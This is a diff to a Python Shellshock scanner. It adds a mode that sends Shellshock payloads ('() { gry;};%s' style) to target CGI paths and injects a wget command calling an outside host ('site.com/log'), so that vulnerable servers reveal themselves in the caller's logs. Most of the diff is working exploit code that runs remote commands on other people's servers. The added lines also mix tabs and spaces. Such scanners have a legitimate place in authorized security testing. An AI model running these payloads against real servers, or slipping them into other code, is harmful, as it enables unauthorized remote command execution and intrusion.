@@ -28,6 +28,7 @@ target_results = []
 concurrent = 20
 PERSOHEADER='test'
 USER_AGENT='ShellShock-Scanner - https://github.com/gry/shellshock-scanner/'
+WGET_RECIVER='site.com/log'
 EXPLOIT1='() { gry;};%s'
 EXPLOIT2='() { _; } >_[$($())] { %s; }'
 EXPLOIT=EXPLOIT2
@@ -130,6 +131,11 @@ def testPing(target_host, cgi_path):
             print "%s%s\t VULNERABLE TO PING TEST" %(target_host, cgi_path)
         print "%s%s - %s - %s - %s" %(target_host, cgi_path, "ping test", "VULNERABLE" if shellshocktest['vulnerable'] else "False", shellshocktest['requests'][1][3])
     return shellshocktest
+	
+def sendWget(target_host, cgi_path):
+    shellshocktest = testShellShock(target_host, cgi_path, "/usr/bin/wget -q -o /dev/null %s" %WGET_RECIVER)
+	print "%s%s\t Request sended, check your logs" %(target_host, cgi_path)
+    return shellshocktest
 
 """
 Dirty code everywhere :S
@@ -211,6 +217,18 @@ def testCGIList(target_host, cgi_list):
             if errors >= ERRORS_TO_ABORT:
                 print "%s aborted due to %s consecutive connection errors" %(cgitest['host'], ERRORS_TO_ABORT)
                 break;
+
+        if 4 in ATTACKS:
+            cgitest = sendWget(target_host, cgi_path)
+            test_list.append(cgitest)
+            if cgitest['error'] is True:
+                errors +=1;
+            else:
+                errors = 0
+            if errors >= ERRORS_TO_ABORT:
+                print "%s aborted due to %s consecutive connection errors" %(cgitest['host'], ERRORS_TO_ABORT)
+                break;
+				
     return test_list
 
 def threadWork():
